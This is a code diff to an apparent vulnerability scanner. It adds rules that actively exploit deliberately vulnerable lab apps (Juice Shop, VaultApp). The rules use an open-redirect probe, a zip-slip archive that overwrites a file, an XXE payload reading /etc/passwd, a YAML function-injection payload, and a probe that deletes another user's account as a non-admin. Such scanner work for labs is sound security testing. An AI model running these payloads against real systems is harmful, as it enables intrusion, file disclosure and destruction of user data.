@@ -56301,6 +56301,210 @@ const juiceShopLoginRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS = "https://github.com/juice-shop/juice-shop";
+
+const juiceShopOpenRedirectLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const toUrl = `https://${OPEN_REDIRECT_PROBE_HOST}/?pwned=${encodeURIComponent(JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS)}`;
+  const url = new URL("/redirect", ctx.origin);
+  url.searchParams.set("to", toUrl);
+  const doc = await ctx.probe.get(url.toString(), {
+    maxBytes: 2048,
+    redirect: "manual",
+    timeoutMs: 15000
+  });
+  const location = doc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!resolvesToOpenRedirectProbe(location, ctx.origin)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: url.toString(),
+      status: doc.status,
+      location,
+      allowlistBypass: JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS,
+      note: "Juice Shop GET /redirect?to= satisfies allowlist when trusted URL appears as query substring then 302 redirects to attacker host — open redirect oracle"
+    }
+  };
+};
+
+const juiceShopOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/redirect\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopOpenRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /redirect route scan — allowlist bypass via embedded trusted URL substring redirects to attacker-controlled host — route-specific open redirect oracle"
+    }
+  };
+};
+
+const JUICE_SHOP_ZIP_TRAVERSAL_B64 =
+  "UEsDBBQAAAAAAHsAB11ETD8DEQAAABEAAAASAAAALi4vLi4vZnRwL2xlZ2FsLm1kVEhVR0lSLVpJUC1PUkFDTEVQSwECFAMUAAAAAAB7AAddREw/AxEAAAARAAAAEgAAAAAAAAAAAAAAgAEAAAAALi4vLi4vZnRwL2xlZ2FsLm1kUEsFBgAAAAABAAEAQAAAAEEAAAAAAA==";
+const JUICE_SHOP_ZIP_TRAVERSAL_CANARY = "THUGIR-ZIP-ORACLE";
+const JUICE_SHOP_FILE_UPLOAD_XXE_XML = `<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<complaint><message>&xxe;</message></complaint>`;
+
+function juiceShopMultipartBody(
+  boundary: string,
+  filename: string,
+  contentType: string,
+  fileBytes: Buffer
+): string {
+  const parts: Buffer[] = [
+    Buffer.from(
+      `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`
+    ),
+    fileBytes,
+    Buffer.from(`\r\n--${boundary}--\r\n`)
+  ];
+  return Buffer.concat(parts).toString("latin1");
+}
+
+async function probeJuiceShopFileUpload(ctx: RuleContext): Promise<RuleResult | null> {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return null;
+  const token = await juiceShopProbeLoginToken(ctx);
+  if (!token) return null;
+  const uploadUrl = new URL("/file-upload", ctx.origin).toString();
+  const authHeader = { Authorization: `Bearer ${token}` };
+
+  const legalUrl = new URL("/ftp/legal.md", ctx.origin).toString();
+  const legalBefore = await ctx.probe.get(legalUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  const zipBytes = Buffer.from(JUICE_SHOP_ZIP_TRAVERSAL_B64, "base64");
+  const zipBoundary = `----ThugirJsZip${Date.now().toString(36)}`;
+  const zipDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: juiceShopMultipartBody(zipBoundary, "complaint.zip", "application/zip", zipBytes),
+    headers: {
+      ...authHeader,
+      "Content-Type": `multipart/form-data; boundary=${zipBoundary}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (zipDoc.status === 204) {
+    const legalAfter = await ctx.probe.get(legalUrl, { maxBytes: 4096, timeoutMs: 15000 });
+    if (
+      legalAfter.status >= 200 &&
+      legalAfter.status < 400 &&
+      legalAfter.body.includes(JUICE_SHOP_ZIP_TRAVERSAL_CANARY) &&
+      legalAfter.body !== legalBefore.body
+    ) {
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          uploadUrl,
+          legalUrl,
+          vector: "zip_path_traversal",
+          canary: JUICE_SHOP_ZIP_TRAVERSAL_CANARY,
+          snippet: legalAfter.body.slice(0, 120).trim(),
+          note: "Juice Shop POST /file-upload accepts ZIP with ../../ftp/legal.md path traversal and overwrites ftp/legal.md — complaint upload zip-slip oracle"
+        }
+      };
+    }
+  }
+
+  const xmlBoundary = `----ThugirJsXml${Date.now().toString(36)}`;
+  const xmlDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: juiceShopMultipartBody(
+      xmlBoundary,
+      "complaint.xml",
+      "application/xml",
+      Buffer.from(JUICE_SHOP_FILE_UPLOAD_XXE_XML, "utf8")
+    ),
+    headers: {
+      ...authHeader,
+      "Content-Type": `multipart/form-data; boundary=${xmlBoundary}`
+    },
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (
+    xmlDoc.status === 410 &&
+    /root:x:0:0:/.test(xmlDoc.body) &&
+    /file:\/\/\/etc\/passwd/i.test(xmlDoc.body)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        uploadUrl,
+        vector: "xml_xxe",
+        status: xmlDoc.status,
+        snippet: xmlDoc.body.match(/root:x:0:0:[^\s<]+/)?.[0] || "",
+        note: "Juice Shop POST /file-upload parses complaint XML with external entities and discloses /etc/passwd in error body — file-upload XXE oracle"
+      }
+    };
+  }
+
+  const yamlPayload = `---\ntest: !!js/function "function (){return 49}"\n`;
+  const yamlBoundary = `----ThugirJsYaml${Date.now().toString(36)}`;
+  const yamlDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: juiceShopMultipartBody(
+      yamlBoundary,
+      "complaint.yml",
+      "application/x-yaml",
+      Buffer.from(yamlPayload, "utf8")
+    ),
+    headers: {
+      ...authHeader,
+      "Content-Type": `multipart/form-data; boundary=${yamlBoundary}`
+    },
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (yamlDoc.status === 410 && /\b49\b/.test(yamlDoc.body) && /complaint\.yml/i.test(yamlDoc.body)) {
+    return {
+      fired: true,
+      confidence: 0.92,
+      evidence: {
+        uploadUrl,
+        vector: "yaml_ssti",
+        status: yamlDoc.status,
+        snippet: yamlDoc.body.match(/deprecated for security reasons:[^<]{0,80}/i)?.[0]?.slice(0, 120),
+        note: "Juice Shop POST /file-upload evaluates complaint YAML via vm.runInContext and leaks computed output — file-upload SSTI oracle"
+      }
+    };
+  }
+
+  return null;
+}
+
+const juiceShopFileUploadLiveOracle: Rule = async (ctx) => {
+  const hit = await probeJuiceShopFileUpload(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const juiceShopFileUploadRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/file-upload\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeJuiceShopFileUpload(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /file-upload route scan — complaint multipart upload chain confirms zip-slip, XXE, or YAML SSTI — route-specific file-upload oracle"
+    }
+  };
+};
+
 function wrongsecretsChallengeIdFromUrl(url: string): string | null {
   const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
   return m?.[1] ?? null;
@@ -65034,8 +65238,8 @@ const vaultappLabGuideRouteLiveOracle: Rule = async (ctx) => {
 type VaultappAuth = { token: string; userId: number; username: string };
 
 const VAULTAPP_LAB_CREDENTIALS = [
-  { username: "sysadmin", password: "adminpass1" },
   { username: "rootadmin", password: "adminpass2" },
+  { username: "sysadmin", password: "adminpass1" },
   { username: "player", password: "player123" }
 ] as const;
 
@@ -65298,6 +65502,79 @@ const vaultappAccountExportApikeyRouteLiveOracle: Rule = async (ctx) => {
       ...hit.evidence,
       scannedUrl: pageUrl,
       note: "VaultApp /api/account/export route scan — X-API-Key header exports another user's account data without session binding — API-key impersonation IDOR oracle"
+    }
+  };
+};
+
+async function probeVaultappAdminUsersDelete(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  let victimId: number | null = null;
+  let victimUsername: string | null = null;
+  for (let id = 1; id <= 60; id++) {
+    if (id === auth.userId) continue;
+    const userUrl = new URL(`/api/users/${id}`, ctx.origin).toString();
+    const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 2048, timeoutMs: 15000 });
+    if (userDoc.status < 200 || userDoc.status >= 300) continue;
+    try {
+      const data = JSON.parse(userDoc.body) as { id?: number; username?: string };
+      if (data.id && data.username) {
+        victimId = data.id;
+        victimUsername = data.username;
+        break;
+      }
+    } catch {
+      /* try next id */
+    }
+  }
+  if (!victimId || !victimUsername) return null;
+  const deleteUrl = new URL(`/api/admin/users/${victimId}`, ctx.origin).toString();
+  const delDoc = await ctx.probe.get(deleteUrl, {
+    method: "DELETE",
+    headers,
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (delDoc.status < 200 || delDoc.status >= 300) return null;
+  if (!/"message"\s*:\s*"User deleted successfully"/i.test(delDoc.body)) return null;
+  const deletedUser = delDoc.body.match(/"deleted_user"\s*:\s*\{[^}]*"username"\s*:\s*"([^"]+)"/)?.[1];
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      deleteUrl,
+      caller: auth.username,
+      victimId,
+      victimUsername: deletedUser || victimUsername,
+      snippet: delDoc.body.slice(0, 200).trim(),
+      note: `VaultApp DELETE /api/admin/users/${victimId} succeeds for authenticated ${auth.username} without admin role check — admin user-delete privilege escalation oracle`
+    }
+  };
+}
+
+const vaultappAdminUsersDeleteLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappAdminUsersDelete(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultappAdminUsersDeleteRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/admin\/users\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappAdminUsersDelete(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "VaultApp /api/admin/users/:id route scan — authenticated non-admin DELETE removes arbitrary user accounts — privilege escalation oracle"
     }
   };
 };
@@ -66964,6 +67241,10 @@ export const RULES: Record<string, Rule> = {
   juiceShopSecurityAnswersDisclosureRouteLiveOracle,
   juiceShopPrivacyRequestsBolaLiveOracle,
   juiceShopPrivacyRequestsBolaRouteLiveOracle,
+  juiceShopOpenRedirectLiveOracle,
+  juiceShopOpenRedirectRouteLiveOracle,
+  juiceShopFileUploadLiveOracle,
+  juiceShopFileUploadRouteLiveOracle,
   wrongsecretsChallengeLiveOracle,
   wrongsecretsChallengeRouteLiveOracle,
   wrongsecretsErrorDemoDatabaseConnectionLiveOracle,
@@ -67781,6 +68062,8 @@ export const RULES: Record<string, Rule> = {
   vaultappMessagesReadIdorRouteLiveOracle,
   vaultappAccountExportApikeyLiveOracle,
   vaultappAccountExportApikeyRouteLiveOracle,
+  vaultappAdminUsersDeleteLiveOracle,
+  vaultappAdminUsersDeleteRouteLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
